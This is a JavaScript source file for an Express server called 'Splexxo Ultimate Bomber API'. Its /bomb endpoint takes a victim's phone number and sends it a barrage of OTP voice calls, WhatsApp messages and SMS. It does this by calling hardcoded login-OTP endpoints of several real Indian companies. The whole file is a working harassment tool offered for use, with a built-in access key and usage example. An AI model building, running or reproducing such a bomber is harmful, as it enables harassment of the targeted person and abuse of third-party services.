const express = require('express');
const cors = require('cors');
const axios = require('axios');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Security Middleware
app.use(helmet());
app.use(cors());
app.use(express.json());

// Rate Limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100
});
app.use(limiter);

// Configuration
const YOUR_API_KEYS = ["SPLEXXO"];
const CACHE_TIME = 3600 * 1000;
const CACHE_FOLDER = '/tmp/cache';
const LOG_FILE = '/tmp/bomb_log.txt';

// Create cache folder if missing
if (!fs.existsSync(CACHE_FOLDER)) {
  fs.mkdirSync(CACHE_FOLDER, { recursive: true });
}

// All Bombing APIs
const BOMBING_APIS = [
  // CALL BOMBING APIS
  {
    "name": "Tata Capital Voice Call",
    "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
    "method": "POST",
    "headers": {"Content-Type": "application/json"},
    "category": "call",
    "data": {"phone": null, "isOtpViaCallAtLogin": "true"}
  },
  {
    "name": "1MG Voice Call", 
    "url": "https://www.1mg.com/auth_api/v6/create_token",
    "method": "POST", 
    "headers": {"Content-Type": "application/json; charset=utf-8"},
    "category": "call",
    "data": {"number": null, "otp_on_call": true}
  },
  {
    "name": "Swiggy Call Verification",
    "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", 
    "method": "POST",
    "headers": {"Content-Type": "application/json; charset=utf-8"},
    "category": "call", 
    "data": {"mobile": null}
  },
  {
    "name": "Myntra Voice Call",
    "url": "https://www.myntra.com/gw/mobile-auth/voice-otp",
    "method": "POST",
    "headers": {"Content-Type": "application/json"},
    "category": "call",
    "data": {"mobile": null}
  },
  {
    "name": "Flipkart Voice Call", 
    "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
    "method": "POST",
    "headers": {"Content-Type": "application/json"},
    "category": "call",
    "data": {"mobile": null}
  },

  // WHATSAPP BOMBING APIS
  {
    "name": "KPN WhatsApp",
    "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
    "method": "POST",
    "headers": {
      "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
      "content-type": "application/json; charset=UTF-8"
    },
    "category": "whatsapp",
    "data": {
      "notification_channel": "WHATSAPP",
      "phone_number": {"country_code": "+91", "number": null}
    }
  },
  {
    "name": "Foxy WhatsApp",
    "url": "https://www.foxy.in/api/v2/users/send_otp", 
    "method": "POST",
    "headers": {"Content-Type": "application/json"},
    "category": "whatsapp",
    "data": {"user": {"phone_number": null}, "via": "whatsapp"}
  },

  // SMS BOMBING APIS  
  {
    "name": "Lenskart SMS",
    "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
    "method": "POST", 
    "headers": {"Content-Type": "application/json"},
    "category": "sms",
    "data": {"phoneCode": "+91", "telephone": null}
  },
  {
    "name": "NoBroker SMS",
    "url": "https://www.nobroker.in/api/v3/account/otp/send",
    "method": "POST",
    "headers": {"Content-Type": "application/x-www-form-urlencoded"},
    "category": "sms", 
    "data": "phone=null&countryCode=IN"
  },
  {
    "name": "PharmEasy SMS",
    "url": "https://pharmeasy.in/api/v2/auth/send-otp", 
    "method": "POST",
    "headers": {"Content-Type": "application/json"},
    "category": "sms",
    "data": {"phone": null}
  },
  {
    "name": "Wakefit SMS",
    "url": "https://api.wakefit.co/api/consumer-sms-otp/",
    "method": "POST",
    "headers": {"Content-Type": "application/json"},
    "category": "sms",
    "data": {"mobile": null}
  }
];

// Utility function to make API calls
async function makeAPICall(apiConfig, phone) {
  try {
    let data = JSON.parse(JSON.stringify(apiConfig.data));
    
    // Replace null with actual phone number
    const updateData = (obj) => {
      for (let key in obj) {
        if (obj[key] === null) {
          obj[key] = phone;
        } else if (typeof obj[key] === 'object') {
          updateData(obj[key]);
        }
      }
    };
    
    updateData(data);
    
    // Special case for NoBroker
    if (apiConfig.name === "NoBroker SMS") {
      data = data.replace('phone=null', `phone=${phone}`);
    }

    // Special case for Foxy WhatsApp
    if (apiConfig.name === "Foxy WhatsApp") {
      data.user.phone_number = `+91${phone}`;
    }

    const config = {
      method: apiConfig.method,
      url: apiConfig.url,
      headers: apiConfig.headers,
      data: data,
      timeout: 10000
    };

    const response = await axios(config);
    
    return {
      success: true,
      name: apiConfig.name,
      category: apiConfig.category,
      status: response.status,
      message: 'Request sent successfully'
    };
    
  } catch (error) {
    return {
      success: false,
      name: apiConfig.name,
      category: apiConfig.category,
      error: error.message,
      status: error.response?.status || 500
    };
  }
}

// Logging function
function logRequest(ip, phone, totalApis, isCached) {
  const ipMask = ip.replace(/(\d+\.\d+)\.\d+\.\d+/, '$1.x.x');
  const time = new Date().toISOString();
  const logEntry = `${time} | ${ipMask} | phone=${phone} | total_apis=${totalApis} | cached=${isCached ? 'yes' : 'no'}\n`;
  
  fs.appendFile(LOG_FILE, logEntry, (err) => {
    if (err) console.error('Logging error:', err);
  });
}

// Routes
app.get('/', (req, res) => {
  res.json({
    message: '🚀 Splexxo Ultimate Bomber API is Running!',
    version: '1.0.0',
    developer: 'splexxo',
    endpoints: {
      '/bomb': 'Start bombing (GET)',
      '/health': 'Health check'
    },
    total_apis: BOMBING_APIS.length,
    usage: 'GET /bomb?phone=9876543210&key=SPLEXXO'
  });
});

// Main bombing endpoint
app.get('/bomb', async (req, res) => {
  const { phone, key } = req.query;
  const clientIP = req.ip || req.connection.remoteAddress;

  // Validation
  if (!phone || !key) {
    return res.status(400).json({
      error: 'Missing parameters',
      example: {
        "url": "/bomb?phone=9876543210&key=SPLEXXO",
        "parameters": {
          "phone": "10 digit phone number",
          "key": "API key"
        }
      }
    });
  }

  // Clean phone number
  const cleanPhone = phone.replace(/[^0-9]/g, '');

  if (cleanPhone.length !== 10 || !/^\d+$/.test(cleanPhone)) {
    return res.status(400).json({
      error: 'Invalid phone number. Must be 10 digits.'
    });
  }

  // Key validation
  if (!YOUR_API_KEYS.includes(key)) {
    return res.status(403).json({
      error: 'Invalid API key'
    });
  }

  // Cache check
  const cacheFile = path.join(CACHE_FOLDER, `bomb_${cleanPhone}.json`);
  let isCached = false;

  try {
    if (fs.existsSync(cacheFile)) {
      const stats = fs.statSync(cacheFile);
      if (Date.now() - stats.mtimeMs < CACHE_TIME) {
        const cachedData = fs.readFileSync(cacheFile, 'utf8');
        res.setHeader('X-Proxy-Cache', 'HIT');
        logRequest(clientIP, cleanPhone, BOMBING_APIS.length, true);
        return res.json(JSON.parse(cachedData));
      }
    }
  } catch (error) {
    console.error('Cache read error:', error);
  }

  // Execute bombing
  try {
    const results = [];
    let callSuccess = 0;
    let whatsappSuccess = 0;
    let smsSuccess = 0;

    // Execute all APIs
    for (let api of BOMBING_APIS) {
      const result = await makeAPICall(api, cleanPhone);
      results.push(result);
      
      // Count successes by category
      if (result.success) {
        switch(api.category) {
          case 'call': callSuccess++; break;
          case 'whatsapp': whatsappSuccess++; break;
          case 'sms': smsSuccess++; break;
        }
      }
    }

    const totalSuccessful = callSuccess + whatsappSuccess + smsSuccess;
    const totalFailed = BOMBING_APIS.length - totalSuccessful;

    // Response data
    const responseData = {
      success: true,
      message: "Bombing completed successfully",
      phone: cleanPhone,
      stats: {
        total_attempted: BOMBING_APIS.length,
        total_successful: totalSuccessful,
        total_failed: totalFailed,
        call_success: callSuccess,
        whatsapp_success: whatsappSuccess,
        sms_success: smsSuccess
      },
      bombing_report: {
        call_bombing: callSuccess > 0 ? `✅ Activated (${callSuccess} calls)` : "❌ Failed",
        whatsapp_bombing: whatsappSuccess > 0 ? `✅ Activated (${whatsappSuccess} messages)` : "❌ Failed",
        sms_bombing: smsSuccess > 0 ? `✅ Activated (${smsSuccess} SMS)` : "❌ Failed"
      },
      detailed_results: results,
      developer: "splexxo",
      powered_by: "splexxo Ultimate Bombing API",
      timestamp: new Date().toISOString()
    };

    // Cache the response
    try {
      fs.writeFileSync(cacheFile, JSON.stringify(responseData, null, 2));
    } catch (error) {
      console.error('Cache write error:', error);
    }

    res.setHeader('X-Proxy-Cache', 'MISS');
    logRequest(clientIP, cleanPhone, BOMBING_APIS.length, false);
    res.json(responseData);

  } catch (error) {
    res.status(500).json({
      success: false,
      error: 'Internal server error',
      message: error.message
    });
  }
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({
    status: '✅ Healthy',
    server: 'Splexxo Ultimate Bomber API',
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    memory: process.memoryUsage(),
    total_apis: BOMBING_APIS.length
  });
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Splexxo Ultimate Bomber API running on port ${PORT}`);
  console.log(`📞 Total APIs: ${BOMBING_APIS.length}`);
  console.log(`🔑 API Keys: ${YOUR_API_KEYS.join(', ')}`);
  console.log(`🌐 Server: http://localhost:${PORT}`);
});

module.exports = app;
